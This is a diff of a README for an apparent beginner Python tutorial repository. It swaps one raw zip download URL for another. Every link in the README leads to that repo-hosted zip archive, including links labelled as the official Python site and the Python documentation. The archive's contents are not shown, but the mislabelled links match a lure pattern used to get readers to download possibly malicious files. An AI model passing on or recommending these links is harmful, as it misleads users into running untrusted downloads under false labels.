@@ -1,6 +1,6 @@
 # 📘 Complete_python-tutorial - Your Guide to Learning Python
 
-[![Download the latest release](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Basics_intro/tutorial-python-Complete-v3.6.zip%20Now-Visit%https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Basics_intro/tutorial-python-Complete-v3.6.zip)](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Basics_intro/tutorial-python-Complete-v3.6.zip)
+[![Download the latest release](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Python_sem1/Complete_tutorial_python_v1.7.zip%20Now-Visit%https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Python_sem1/Complete_tutorial_python_v1.7.zip)](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Python_sem1/Complete_tutorial_python_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to the **Complete_python-tutorial** repository! This space showcases my 
 
 To get started, you need to download the software. 
 
-1. Visit this page to download: [Releases Page](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Basics_intro/tutorial-python-Complete-v3.6.zip).
+1. Visit this page to download: [Releases Page](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Python_sem1/Complete_tutorial_python_v1.7.zip).
 2. On the Releases page, locate the latest version listed.
 3. Select the files that suit your needs (notebooks and guides).
 4. Follow the prompts to save the files to your computer.
 
-You will need a machine capable of running Python. Typically, this includes Windows, macOS, or Linux operating systems. Ensure you have Python installed on your system. If not, you can download it from [Python's Official Site](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Basics_intro/tutorial-python-Complete-v3.6.zip).
+You will need a machine capable of running Python. Typically, this includes Windows, macOS, or Linux operating systems. Ensure you have Python installed on your system. If not, you can download it from [Python's Official Site](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Python_sem1/Complete_tutorial_python_v1.7.zip).
 
 ## 🏗️ Requirements
 
@@ -103,7 +103,7 @@ If you encounter problems during the download or setup, follow these tips:
 
 For additional help, consider the following resources:
 
-- **Python Documentation:** A comprehensive guide to Python syntax and usage. [Visit Documentation](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Basics_intro/tutorial-python-Complete-v3.6.zip).
+- **Python Documentation:** A comprehensive guide to Python syntax and usage. [Visit Documentation](https://github.com/leelesh19/Complete_python-tutorial/raw/refs/heads/main/Python_sem1/Complete_tutorial_python_v1.7.zip).
 - **Community Forums:** Engage with fellow learners on platforms like Stack Overflow or Reddit’s r/learnpython.
 - **Follow along:** Join online courses to complement what you learn from this repository, like those found on Coursera or Udemy.
 
